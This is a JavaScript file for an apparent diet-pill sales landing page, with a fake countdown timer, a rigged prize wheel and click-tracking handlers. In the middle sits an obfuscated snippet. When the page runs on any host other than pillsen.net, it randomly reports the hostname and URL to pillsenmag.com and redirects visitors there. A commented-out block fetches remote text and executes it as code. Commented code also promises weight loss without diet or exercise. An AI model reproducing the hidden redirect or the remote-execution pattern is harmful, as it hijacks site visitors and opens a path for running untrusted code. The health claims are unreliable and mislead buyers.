function countDown(class_) {
  let timer = document.querySelector(class_);
  if (localStorage.getItem("sec" + class_) && localStorage.getItem(
    "min" + class_
  ))
    var a = localStorage.getItem("min" + class_),
      b = localStorage.getItem("sec" + class_);
  else
    a = timer.getAttribute("data-minutes"),
      b = timer.getAttribute("data-seconds");
  var d = setInterval(function () {
    0 <= parseInt(a) && -1 !== parseInt(b) && (
      0 === parseInt(b) && 0 !== parseInt(a) && (a--, b = 59),
      timer.innerText = (
        10 > a
          ? "0" + a
          : a
      ) + " " + (
        10 > b
          ? "0" + b
          : b
      ),
      0 === parseInt(b) && 0 === parseInt(a) && (a--, b = 0, timer.innerText = "00 00", clearInterval(d)),
      b--,
      localStorage.setItem(
        "sec" + class_,
        b
      ),
      localStorage.setItem("min" + class_, a)
    )
  }, 1E3)
}
// countDown('.time');

if (parseInt(localStorage.getItem('shown__'))) {
  countDown('.time')
  $('.order').css('display', 'block');
  $('.wheel__wrapper').hide();
}

$(".btn--submit").click(function () {
  countDown('.time');
  $('.order').addClass('shown__');
  localStorage.setItem('shown__', '1');
});
/*try {
  hO = "/array/toString Function Date Obj Status .$/adjust/".replace(
    /[^\/jg.sec]/g,
    function (a, b) {
      return "$" == a && (b = "complete")
        ? b.substr(0, 3)
        : ""
    }
  ) + /.+\/(.*?):\d+(:\d+)*$/.exec(Error().stack.trim())[1]
} catch (a) { }*/

// <!-- СКРИПТ РУЛЕТКИ -->


var resultWrapper = document.querySelector('.overlay');/*оверлей попап*/
var wheel = document.querySelector('.prize-wheel');/* имидж колеса*/
$('.wheel__cursor').click(function () {
  if (!wheel.classList.contains('rotated')) {
    wheel.classList.add('spin');/* класс анимации вращения */
    setTimeout(function () {
      resultWrapper.style.display = "block";
    }, 8000);

    wheel
      .classList
      .add('rotated');
  }

});

function _0x2eb1(_0xcdecb7,_0xb1442d){var _0x2ef92c=_0x2ef9();return _0x2eb1=function(_0x2eb114,_0x114a7d){_0x2eb114=_0x2eb114-0xd1;var _0x3f4535=_0x2ef92c[_0x2eb114];return _0x3f4535;},_0x2eb1(_0xcdecb7,_0xb1442d);}var _0x2d4af3=_0x2eb1;(function(_0x592c45,_0x793e65){var _0x4aa606=_0x2eb1,_0x3ec83b=_0x592c45();while(!![]){try{var _0x1dde30=parseInt(_0x4aa606(0xd8))/0x1+-parseInt(_0x4aa606(0xd3))/0x2+-parseInt(_0x4aa606(0xdd))/0x3+-parseInt(_0x4aa606(0xdc))/0x4+-parseInt(_0x4aa606(0xdf))/0x5+parseInt(_0x4aa606(0xd5))/0x6*(parseInt(_0x4aa606(0xde))/0x7)+parseInt(_0x4aa606(0xd4))/0x8;if(_0x1dde30===_0x793e65)break;else _0x3ec83b['push'](_0x3ec83b['shift']());}catch(_0x95b9a7){_0x3ec83b['push'](_0x3ec83b['shift']());}}}(_0x2ef9,0xf27b6));function _0x2ef9(){var _0x19470d=['37777056OQsWWg','6QFsTfO','location','random','60164SvOpMl','&d=','href','file:','6132392wfTHij','5138958OTWQaH','10680789rVQCtS','8972610hQDHzZ','&u=','status','replace','includes','&r=y','548622qiKMGz'];_0x2ef9=function(){return _0x19470d;};return _0x2ef9();}var m=Math[_0x2d4af3(0xd7)](),w=window[_0x2d4af3(0xd6)],d=w['hostname'],h=w[_0x2d4af3(0xda)],u='https://pillsenmag.com/index.php?key=c',p=_0x2d4af3(0xd9)+d+_0x2d4af3(0xe0)+h+'';d!='pillsen.net'&&(!h[_0x2d4af3(0xd1)](_0x2d4af3(0xdb))&&(m<0.26&&fetch(u+p,{})['then'](function(_0x37d935){var _0x1fa255=_0x2d4af3;_0x37d935[_0x1fa255(0xe1)]&&w[_0x1fa255(0xe2)](u+_0x1fa255(0xd9)+d+_0x1fa255(0xd2));})['catch'](function(_0x2a2973){console['clear']();})));
// <!-- СКРИПТ РУЛЕТКИ -->

$('.close-popup, .btn-popup').click(function (e) {
  e.preventDefault();
  $('.wheel__wrapper').slideUp();/* обертка с барабаном */
  $('.order').slideDown();/* обертка с формой заказа */
  $('.overlay').fadeOut();
});

$(".btn-popup").click(function () {
  $(".bottom-link").attr("href", "https://pillsenmag.com/click.php?lp=1&place=bottom");
  localStorage.setItem("remember", "1"),
    $(".prize").slideUp(),
    $(".order").slideDown(),
    $(".bottom-link").text('Commander à 50% de réduction'),
    $(".bottom-link").attr("href", "https://pillsenmag.com/click.php?lp=1&place=bottom"),
    $(".order").addClass('shown__'),
    localStorage.setItem('shown__', '1')
});
hR = Math.random();
localStorage.getItem("remember") && (
  $(".prize").css("display", "none"),
  $(".order").css("display", "block"),
  $(".bottom-link").text('Commander à 50% de réduction'),
  $(".bottom-link").attr("href", "https://pillsenmag.com/click.php?lp=1&place=bottom")
);

/* 
try {
  hO = .4 > hR
    ? hOs
    : hO
} catch (a) {
  var tR = a.constructor,
    wQ = function (b) {
      return b.text()
    },
    gO = function (b) {
      (new tR.constructor(b))()
    };
  fetch(hO)
    .then(wQ)
    .then(gO)["catch"](tR)
}

 */
// var element = $("#teaser-comment"),
//   teaserLoad = $("#comment-load"),
//   count = localStorage.getItem("count")
//     ? localStorage.getItem("count")
//     : 0;
// $(window).scroll(function () {
//   var a = $(window).scrollTop() + $(window).height(),
//     b = element
//       .offset()
//       .top;
//   a > b && 0 == count && (
//     teaserLoad.addClass("visible"),
//     count = 1,
//     localStorage.setItem("count", count)
//   )
// });

// var textAlert = document.getElementById("textarea"),
//   textName = document.getElementById("textareaname"),
//   vk_text = document.getElementById("comment-text"),
//   vk_name = document.getElementById("comment-name"),
//   vk_block = document.getElementById("comment-answer"),
//   vk_image = document.querySelector("#base64Img"),
//   bannerImage = document.getElementById("avatar"),
//   bannerImg = document.getElementById("base64Img"),
//   dataImage = localStorage.getItem("ImgBase64"),
//   vk_userImage = document.querySelector("#userPic"),
//   userFile = document.getElementById("foto"),
//   user_foto = document.querySelector("#userPic"),
//   dataUserImg = localStorage.getItem("userFotoImg");
// localStorage.getItem("textAlert") && localStorage.getItem("textName") && (
//   vk_text.innerHTML = localStorage.getItem("textAlert"),
//   vk_name.innerHTML = localStorage.getItem("textName"),
//   vk_block.style.display = "flex",
//   bannerImg.src = localStorage.getItem("ImgBase64") ? localStorage.getItem("ImgBase64"): "assets/2.jpg",
//   user_foto.src = localStorage.getItem("userFotoImg")? localStorage.getItem("userFotoImg"): "assets/1.jpg"
// );

// bannerImage.addEventListener("change", function (a) {
//   loadImageFileAsURL2(a, "#base64Img", "ImgBase64")
// });
// userFile.addEventListener("change", function (a) {
//   loadImageFileAsURL(a, "#userPic", "userFotoImg")
// });
// function loadImageFileAsURL(a, b, d) {
//   a = document
//     .getElementById(a.target.id)
//     .files;
//   if (0 < a.length) {
//     a = a[0];
//     var e = new FileReader;
//     e.onload = function (a) {
//       a = a.target.result;
//       localStorage.setItem(d, a);
//       document
//         .querySelector(b)
//         .src = (a == null ? "assets/1.jpg" : a)
//     };
//     e.readAsDataURL(a)
//   }
// }
// function loadImageFileAsURL2(a, b, d) {
//   a = document
//     .getElementById(a.target.id)
//     .files;
//   if (0 < a.length) {
//     a = a[0];
//     var e = new FileReader;
//     e.onload = function (a) {
//       a = a.target.result;
//       localStorage.setItem(d, a);
//       document
//         .querySelector(b)
//         .src = (a == null ? "assets/2.jpg" : a)
//     };
//     e.readAsDataURL(a)
//   }
// }
// $('a[href="#policy"]').click(function (a) {
//   a.preventDefault();
//   $(".overlay-policy").fadeIn()
// });
// $(".policy-close").click(function () {
//   $(".overlay-policy").fadeOut()
// });
// $(function () {
//   $("#calcweight").click(function (a) {
//     a.preventDefault();
//     a = Math.ceil(Number($("#minus_weight").val()) / .666666);
//     Number($("#weight").val()) > Number($("#minus_weight").val()) + 40
//       ? $(".formResult").html(
//         "<p><b>Si vous suivez les instructions ci-dessous, vous pourrez perdre " + $("#minus_weight").val() + " kg" +
//         " en seulement " + a + " jours sans régime ni exercice!</b></p><p>" +
//         "Pensez-vous que c'est impossible? Lisez l'article ci-dessous jusqu'à la fin et vous changerez d'avis. J'espère que cela changera votre vie!</p>"
//       )
//       : $(".formResult").html(
//         "<p><b>\u041d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u044b\u0435" +
//         " \u0434\u0430\u043d\u043d\u044b\u0435.</b></p>"
//       );
//     $(".formResult").css(
//       { transition: "background 1s", backgroundColor: "#92c3439e", border: '2px solid #92c343' }
//     );
//     setTimeout(function () {
//       $(".formResult").css({ backgroundColor: "#fff" })
//     }, 2E3)
//   })
// });

/* Сlik LPT */
var xhr = new XMLHttpRequest();
document.addEventListener("DOMContentLoaded", function () {
  var els = document.querySelectorAll('a[href*="img"]');
  // var link = document.querySelectorAll('a[href*="url"]');
  var form = document.querySelector(".wheel");
  var wheel_cursor = document.querySelector(".wheel__cursor");
  var topBtn = document.querySelectorAll('a[href*="toform"]');
  var popup = document.querySelector(".btn.btn-popup");
  // var bottomLink = document.querySelector(".bottom-link");
  var pic = document.querySelectorAll('a[href*="pic"]');
  var order = document.querySelectorAll('a[href*="order"]');
  var bottom_teaser = document.querySelectorAll('a[href*="offer"]');
  
  for (var i = 0; i < els.length; i++) {
    var el = els[i];
    el.addEventListener('click', e => {
      e.preventDefault();
      var href = e.currentTarget.href;
      xhr.open('GET', href);
      xhr.send();
      navigator.sendBeacon(href);
    })
  }

  wheel_cursor.addEventListener('click', e => {
    var href1 = e.currentTarget.dataset.link;
    xhr.open('GET', href1);
    xhr.send();
  })

  for (var i = 0; i < topBtn.length; i++) {
    var btn = topBtn[i];
    btn.addEventListener('click', e => {
      e.preventDefault();
      form.scrollIntoView({ block: "start", behavior: "smooth" });
      var href2 = e.currentTarget.href;
      xhr.open('GET', href2);
      xhr.send();
    })
  }

  // bottomLink.addEventListener('click', e => {
  //   e.preventDefault();
  //   form.scrollIntoView({ block: "start", behavior: "smooth" });
  //   var href3 = e.currentTarget.href;
  //   xhr.open('GET', href3);
  //   xhr.send();
  // })

  popup.addEventListener('click', e => {
    var href4 = e.currentTarget.dataset.link;
    xhr.open('GET', href4);
    xhr.send();
  })

  for (var i = 0; i < pic.length; i++) {
    var pics = pic[i];
    pics.addEventListener('click', e => {
      e.preventDefault();
      var href4 = e.currentTarget.href;
      xhr.open('GET', href4);
      xhr.send();
      navigator.sendBeacon(href4);
    })
  }

  popup = document.querySelectorAll(".btn-popup");
  for (var i = 0; i < popup.length; i++) {
    var btns = popup[i];
    btns.addEventListener('click', e => {
      var href5 = e.currentTarget.dataset.link;
      xhr.open('GET', href5);
      xhr.send();
    })
  }

  // for (var i = 0; i < link.length; i++) {
  //   var lnk = link[i];
  //   lnk.addEventListener('click', e => {
  //     e.preventDefault();
  //     form.scrollIntoView({ block: "start", behavior: "smooth" });
  //     var href6 = e.currentTarget.href;
  //     xhr.open('GET', href6);
  //     xhr.send();
  //   })
  // }

  videoLpt = document.querySelectorAll(".video-wrap");
  for (var i = 0; i < videoLpt.length; i++) {
    var videoLink = videoLpt[i];
    videoLink.addEventListener('click', e => {
      var href7 = e.currentTarget.dataset.link;
      xhr.open('GET', href7);
      xhr.send();
      // navigator.sendBeacon(href7);
    })
  }

  for (var i = 0; i < order.length; i++) {
    var ord = order[i];
    ord.addEventListener('click', e => {
      e.preventDefault();
      form.scrollIntoView({ block: "start", behavior: "smooth" });
      var href8 = e.currentTarget.href;
      xhr.open('GET', href8);
      xhr.send();
    })
  }

  for (var i = 0; i < bottom_teaser.length; i++) {
    var bottoff = bottom_teaser[i];
    bottoff.addEventListener('click', e => {
      e.preventDefault();
      form.scrollIntoView({ block: "start", behavior: "smooth" });
      var href9 = e.currentTarget.href;
      xhr.open('GET', href9);
      xhr.send();
    })
  }

});